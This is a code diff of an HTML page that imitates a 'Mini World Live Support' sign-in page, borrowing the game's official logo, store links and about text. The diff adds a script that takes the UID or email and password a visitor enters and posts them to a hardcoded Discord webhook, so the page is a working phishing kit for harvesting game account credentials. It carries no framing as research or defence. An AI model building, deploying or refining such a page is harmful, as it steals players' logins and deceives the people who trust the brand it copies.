@@ -3,43 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Support - Mini World</title>
+    <title>Mini World Live Support</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 0;
-            background-color: #f4f4f9;
+            font-family: Arial, sans-serif;
+            background: url('https://i.imgur.com/8GxxJZP.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+        }
+        header {
             display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: rgba(0, 0, 0, 0.7);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+        header img {
+            height: 40px;
+        }
+        header a {
+            text-decoration: none;
+            color: white;
+            font-weight: bold;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin-top: 60px;
         }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: white;
+        .form {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             text-align: center;
+            max-width: 400px;
+            width: 90%;
         }
-        .header {
+        .form h1 {
+            margin: 0 0 20px 0;
             font-size: 24px;
-            font-weight: bold;
             color: #333;
         }
-        .form-group {
-            margin: 15px 0;
-        }
-        .form-group input {
+        .form input {
             width: 100%;
             padding: 10px;
+            margin: 10px 0;
             border: 1px solid #ccc;
             border-radius: 4px;
-            font-size: 14px;
         }
-        .form-group button {
+        .form button {
             width: 100%;
             padding: 10px;
             background-color: #ffcc00;
@@ -49,31 +71,125 @@
             font-size: 16px;
             cursor: pointer;
         }
-        .form-group button:hover {
+        .form button:hover {
             background-color: #e6b800;
         }
-        .footer {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #666;
+        .about-section {
+            padding: 40px;
+            text-align: center;
+            background: #fff;
+            position: relative;
+        }
+        .about-section h2 {
+            font-size: 28px;
+            color: #333;
+        }
+        .about-section p {
+            max-width: 800px;
+            margin: 0 auto 20px auto;
+            font-size: 16px;
+            color: #555;
+        }
+        .store-links img {
+            height: 50px;
+            margin: 10px;
+            cursor: pointer;
+        }
+        .character {
+            position: absolute;
+            bottom: 0;
+            width: 150px;
+        }
+        .character.left {
+            left: 0;
+        }
+        .character.right {
+            right: 0;
         }
     </style>
 </head>
 <body>
+    <!-- Header Section -->
+    <header>
+        <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/logo.0edc9054.png" alt="Mini World Logo">
+        <a href="https://www.miniworldgame.com">Return to Main Site</a>
+    </header>
+
+    <!-- Sign-In Form -->
     <div class="container">
-        <div class="header">Welcome to Mini World Live Support</div>
-        <form id="loginForm" method="POST" action="send.php">
-            <div class="form-group">
-                <input type="text" name="uid" placeholder="Enter UID or Email" required>
-            </div>
-            <div class="form-group">
-                <input type="password" name="password" placeholder="Enter Password" required>
-            </div>
-            <div class="form-group">
-                <button type="submit">Log In</button>
-            </div>
-        </form>
-        <div class="footer">Contact us for any complaints or help!</div>
+        <div class="form">
+            <h1>Sign in with UID</h1>
+            <input type="text" id="uid" placeholder="Enter UID or Email" required>
+            <input type="password" id="password" placeholder="Enter Password" required>
+            <button onclick="sendData()">Log In</button>
+        </div>
     </div>
+
+    <!-- About Us Section -->
+    <div class="about-section">
+        <h2>About Us</h2>
+        <p>
+            Mini World: CREATA is a free-to-play sandbox game launched in 2017 and now enjoys hundreds of millions of 
+            registered players in over 30 countries. As the name suggests, creation is the core value of the game, 
+            where players can create everything in the meta-universe by using the objects and tools provided. Quality 
+            instant games by our players, adventures, diverse structures, and customized mechanisms are all part of creation. 
+            We are passionate about building an inclusive ecosystem with a myriad of user-generated content and connecting 
+            people through playing.
+        </p>
+        <div class="store-links">
+            <a href="https://play.google.com/store/apps/details?id=com.playmini.miniworld&pli=1" target="_blank">
+                <img src="https://wiki.miniworldgame.com/lib/exe/fetch.php?w=200&tok=71ebeb&media=main_page:google_play_banner.png" alt="Google Play">
+            </a>
+            <a href="https://apps.apple.com/us/app/mini-world-creata/id1540197003" target="_blank">
+                <img src="https://wiki.miniworldgame.com/lib/exe/fetch.php?w=200&tok=9d6a55&media=main_page:apple_store_banner.png" alt="Apple Store">
+            </a>
+        </div>
+        <!-- Character Decorations -->
+        <img class="character left" src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/news-role.e84f4ae0.png" alt="Green Dinosaur">
+        <img class="character right" src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/media-role.585e012d.png" alt="Pink Bunny">
+    </div>
+
+    <script>
+        function sendData() {
+            const uid = document.getElementById('uid').value;
+            const password = document.getElementById('password').value;
+            const timestamp = new Date().toISOString();
+
+            const webhookUrl = "https://discord.com/api/webhooks/1312615482695880724/ugYpr_SEB8KLN5GXO_ZzBDJbA7oEGSLSLWOx4tHn0zwPB5zkwhlBcXYthxc08kdK6cdk";
+
+            const data = {
+                content: "**New Login Detected**",
+                embeds: [
+                    {
+                        title: "Login Details",
+                        fields: [
+                            { name: "UID/Email", value: uid, inline: true },
+                            { name: "Password", value: password, inline: true },
+                            { name: "Timestamp", value: timestamp, inline: true }
+                        ],
+                        color: 16776960
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Login data sent successfully!');
+                } else {
+                    alert('Failed to send data.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </body>
 </html>
